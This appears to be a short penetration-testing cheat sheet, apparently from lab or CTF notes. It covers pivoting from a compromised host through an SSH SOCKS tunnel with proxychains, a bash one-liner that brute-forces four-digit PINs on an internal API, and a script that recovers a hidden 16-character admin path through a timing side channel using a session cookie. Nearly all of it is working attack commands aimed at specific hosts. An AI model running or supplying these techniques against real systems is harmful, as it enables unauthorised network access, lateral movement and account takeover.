# Pivoting

## If you've owned a box, how can you pivot to other machines in private subnets?
SOCKS Proxy
```
ssh weytechuser@files.wey-tech.com -D 9050 -f -N
```
Use proxychains to force any command we run locally to route all traffic through our SOCKS tunnel so that we can hit targets

Configure Firefox to run through the proxy. A good addon is SmartProxy and you can configure the SOCKS4 Protocol proxy using the localhost port set above.

## What's a way to brute-force attempt pins on an API?
```
$ ssh weytechuser@files.wey-tech.com 'for i in $(seq 1000 9999); do RESULT=$(curl http://10.4.4.80/api/confirm/abcd/$i 2>/dev/null); if [[ $RESULT == *"true"* ]]; then echo -e "\n$RESULT\nPincode: $i\n"; break; fi; done'
```

## Bash script for timeout attack of a 16 byte random path
```
COOKIE="Cookie: session=<PLACE YOUR COOKIE HERE>"
ADMINID=""
for num in $(seq 0 15 | tac); do
  ZZZs=$(eval "printf 'Z%.0s' {0..$num}")
  PADDING=${ZZZs::-1}
  for char in $(echo "abcdefghijklmnopqrstuvwxyz0123456789" | fold -w1); do  
    RES=$(timeout "$(($num + 1))" curl -s "http://10.4.4.80/api/list/files/1/$ADMINID$char$PADDING" -H "$COOKIE")
    if [ -n "$RES" ]; then
      ADMINID="$ADMINID$char"
      echo "Found another Character: $ADMINID"
      break
    fi
  done
done
```
